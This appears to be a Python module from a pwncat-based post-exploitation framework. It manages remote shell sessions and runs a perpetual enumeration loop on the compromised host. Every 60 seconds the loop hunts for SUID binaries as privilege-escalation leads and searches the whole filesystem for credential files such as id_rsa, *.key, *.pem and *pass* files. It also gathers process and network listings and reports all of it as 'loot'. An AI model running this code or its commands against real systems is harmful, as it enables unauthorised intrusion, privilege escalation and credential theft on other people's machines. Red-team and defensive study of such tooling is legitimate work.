import logging
import re
import threading
import time
from collections import deque
from queue import Queue, Empty

import pwncat

log = logging.getLogger("pwncat")


def parse_ls_output(output: str):
    """Helper function to parse 'ls -lA --time-style=long-iso' output."""
    items = []
    ls_pattern = re.compile(
        r"^(?P<type>[d\-l])(?P<perms>.{9})\s+"
        r"(?P<links>\d+)\s+"
        r"(?P<owner>\S+)\s+"
        r"(?P<group>\S+)\s+"
        r"(?P<size>\d+)\s+"
        r"(?P<date>\d{4}-\d{2}-\d{2})\s+"
        r"(?P<time>\d{2}:\d{2})\s+"
        r"(?P<name>.+)"
    )
    for line in output.strip().splitlines():
        match = ls_pattern.match(line.strip())
        if match:
            details = match.groupdict()
            name_part = details['name']
            name = name_part.split(' -> ')[0] if ' -> ' in name_part else name_part
            items.append({
                "name": name,
                "path": name,
                "is_dir": details['type'] == 'd'
            })
    return items

class PwncatSession:
    """Represents an active session, managing IO and subprocess interaction."""

    def __init__(self, session_id, client_address):
        self.id = session_id
        self.platform = "linux"
        self.client_address = client_address
        self.terminal_buffer = deque(maxlen=2048)
        self.terminal_listener = None
        self.enumeration_listener = None

        self.command_queue = deque()
        self.utility_queue = Queue()
        self.utility_result = None
        self.utility_marker = None

        self.ssig = pwncat.InterruptHandler(keep_open=True, no_shutdown=False)
        enc = pwncat.StringEncoder()
        self.proc = pwncat.IOCommand(self.ssig, pwncat.DsIOCommand(enc, "/bin/sh", -1))

        self.known_loot = set()
        self.known_privesc = set()

        threading.Thread(target=self.proc_to_session_loop, daemon=True).start()
        threading.Thread(target=self.session_to_proc_loop, daemon=True).start()
        log.info(f"Session {self.id}: Initialized for {client_address}")

    def start_enumeration(self, listener):
        self.enumeration_listener = listener
        threading.Thread(target=self.enumeration_loop, daemon=True).start()

    def enumeration_loop(self):
        """Periodically runs enumeration commands and reports findings."""
        log.info(f"Session {self.id}: Starting perpetual enumeration loop.")
        time.sleep(5)

        # One-time checks
        self.check_os_info()

        while not self.ssig.has_terminate():
            self.check_suid_binaries()
            self.check_cred_files()
            self.check_processes()
            self.check_netstat()
            time.sleep(60)

    def check_os_info(self):
        output = self.execute_utility_command("uname -a")
        if output and "os_info" not in self.known_loot:
            self.known_loot.add("os_info")
            loot = {"type": "os_info", "source": "uname -a", "content": output.strip()}
            if self.enumeration_listener: self.enumeration_listener.onNewLoot(loot)

    def check_suid_binaries(self):
        output = self.execute_utility_command("find / -perm -u=s -type f 2>/dev/null")
        if output:
            for line in output.strip().splitlines():
                if line and line not in self.known_privesc:
                    self.known_privesc.add(line)
                    finding = {"name": f"SUID: {line.split('/')[-1]}", "description": line,
                               "exploit_id": line}
                    if self.enumeration_listener: self.enumeration_listener.onNewPrivescFinding(
                        finding)

    def check_cred_files(self):
        output = self.execute_utility_command(
            'find / -type f \\( -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "*pass*" \\) 2>/dev/null')
        if output:
            for line in output.strip().splitlines():
                if line and line not in self.known_loot:
                    self.known_loot.add(line)
                    loot = {"type": "credential_file", "source": line,
                            "content": "Potential credential file."}
                    if self.enumeration_listener: self.enumeration_listener.onNewLoot(loot)

    def check_processes(self):
        output = self.execute_utility_command("ps aux")
        if output and "processes" not in self.known_loot:
            self.known_loot.add("processes")
            loot = {"type": "processes", "source": "ps aux", "content": output.strip()}
            if self.enumeration_listener: self.enumeration_listener.onNewLoot(loot)

    def check_netstat(self):
        output = self.execute_utility_command("netstat -antp")
        if output and "netstat" not in self.known_loot:
            self.known_loot.add("netstat")
            loot = {"type": "netstat", "source": "netstat -antp", "content": output.strip()}
            if self.enumeration_listener: self.enumeration_listener.onNewLoot(loot)

    def proc_to_session_loop(self):
        output_buffer = ""
        for data in self.proc.producer():
            decoded_data = pwncat.StringEncoder.decode(data)
            if self.utility_marker and self.utility_marker in decoded_data:
                output_buffer += decoded_data.split(self.utility_marker)[0]
                self.utility_result = output_buffer
                output_buffer = ""
            elif self.utility_marker is not None:
                output_buffer += decoded_data
            else:
                if self.terminal_listener:
                    try:
                        self.terminal_listener.onOutput(decoded_data)
                    except Exception as e:
                        log.error(f"Session {self.id}: Error in terminal_listener.onOutput: {e}")
                self.terminal_buffer.append(data)

    def session_to_proc_loop(self):
        while not self.ssig.has_terminate():
            try:
                command = self.utility_queue.get_nowait()
                self.proc.consumer(command)
            except Empty:
                if self.command_queue:
                    command = self.command_queue.popleft()
                    self.proc.consumer(command)
                else:
                    time.sleep(0.05)

    def execute_utility_command(self, command: str) -> str:
        marker = f"END_MARKER_{int(time.time())}_{id(self)}"
        full_command = f"{command}; echo {marker}\n"

        self.utility_marker = marker
        self.utility_result = None

        self.utility_queue.put(pwncat.StringEncoder.encode(full_command))

        start_time = time.time()
        while self.utility_result is None and not self.ssig.has_terminate():
            if time.time() - start_time > 30:  # 30 second timeout for long-running commands like `find`
                log.error(f"Session {self.id}: Timeout waiting for utility command: {command}")
                self.utility_marker = None
                return None
            time.sleep(0.1)

        result = self.utility_result
        self.utility_marker = None
        self.utility_result = None

        return result

    def send_interactive_command(self, command_bytes: bytes):
        self.command_queue.append(command_bytes)